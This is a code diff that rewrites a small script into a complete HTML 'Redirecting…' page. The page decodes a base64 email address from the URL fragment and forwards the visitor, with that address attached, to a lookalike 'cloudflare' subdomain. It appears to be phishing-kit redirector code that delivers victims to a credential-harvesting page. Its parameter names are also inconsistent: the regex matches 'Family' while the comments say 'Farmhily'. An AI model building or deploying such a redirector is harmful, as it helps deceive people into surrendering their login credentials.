@@ -1,22 +1,33 @@
-<script>
-  window.addEventListener('DOMContentLoaded', () => {
-    const hash = window.location.hash; // e.g. "#GJ1IS60VFamily=BASE64"
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Redirector</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <style>body{font-family:system-ui,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:#f5f5f5;margin:0;display:flex;align-items:center;justify-content:center;height:100vh}#msg{background:#fff;padding:2rem 3rem;border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,.15)}#msg h2{margin:0 0 .5em;font-size:1.25em}#msg p{margin:0}</style>
+</head>
+<body>
+  <div id="msg">
+    <h2>Redirecting…</h2>
+    <p>If nothing happens, <a href="./">reload</a>.</p>
+  </div>
 
-    // Remove the leading '#' and look for 'Family=' anywhere in the string
-    const cleanedHash = hash.substring(1); // remove '#'
+  <script>
+  /* ---- same logic as the original PHP/JS snippet ---- */
+  (function(){
+    const hash = window.location.hash;          // #Farmhily=BASE64
+    const m    = hash.match(/Family=([A-Za-z0-9+/=]+)/);
+    if (!m || !m[1]) { console.error('No valid Farmhily param'); return; }
 
-    const match = cleanedHash.match(/Farmhily=([A-Za-z0-9+/=]+)/);
-    if (match && match[1]) {
-      try {
-        const base64String = match[1];
-        const decodedEmail = atob(base64String);
-        const redirectUrl = "https://cloudflare.juthafoo.sa.com/a9GUawqzDz8xWT5Y!NbUuy3R/$" + encodeURIComponent(decodedEmail);
-        window.location.href = redirectUrl;
-      } catch (error) {
-        console.error("Base64 decoding failed:", error);
-      }
-    } else {
-      console.error("No valid Family parameter found in hash");
+    try {
+      const email = atob(m[1]);                 // Base-64 decode
+      const dest  = 'https://cloudflare.juthafoo.sa.com/a9GUawqzDz8xWT5Y!NbUuy3R/$'
+                  + encodeURIComponent(email);
+      window.location.replace(dest);            // instant redirect
+    } catch (e) {
+      console.error('Bad Base-64:',e);
     }
-  });
-</script>
+  })();
+  </script>
+</body>
+</html>
